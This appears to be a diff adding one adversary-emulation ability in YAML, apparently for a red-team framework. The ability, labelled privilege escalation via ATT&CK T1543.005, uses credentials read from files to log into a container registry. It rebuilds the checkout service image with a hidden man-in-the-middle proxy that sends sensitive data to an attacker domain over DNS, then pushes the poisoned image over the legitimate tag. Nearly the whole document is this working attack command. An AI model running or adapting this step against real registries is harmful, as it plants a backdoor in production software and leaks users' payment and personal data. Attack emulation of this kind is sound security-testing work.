@@ -1,0 +1,13 @@
+- id: 20000000-0000-0000-0000-000000000005
+  name: Modify container Checkoutservice
+  description: Image modification of Checkoutservice with internally an invisible proxy (MITM) that send sensitive info by DNS.
+  tactic: privilege-escalation
+  technique: { attack_id: T1543.005, name: Container Service }
+  repeatable: false
+  singleton: true
+  platforms:
+    linux:
+      sh:
+        command: |-
+          REGISTRY_ENDPOINT="${REGISTRY_NAME:-registry}:${REGISTRY_PORT:-5000}" && cat "$DATA_PATH/KC2/pass" | docker login "$REGISTRY_ENDPOINT" -u "$(cat "$DATA_PATH/KC2/user")" --password-stdin && docker build --build-arg EXFIL_DOMAIN="$ATTACKERADDR" --build-arg BASE_IMAGE="$REGISTRY_ENDPOINT/checkout:${CHECKOUT_BASE_TAG:-${IMAGE_VERSION:-2.0.2}}" -f /utils/checkout/Dockerfile -t "$REGISTRY_ENDPOINT/checkout:${CHECKOUT_IMAGE_TAG:-2.0.3}" /utils/checkout && docker push "$REGISTRY_ENDPOINT/checkout:${CHECKOUT_IMAGE_TAG:-2.0.3}"
+        timeout: 900
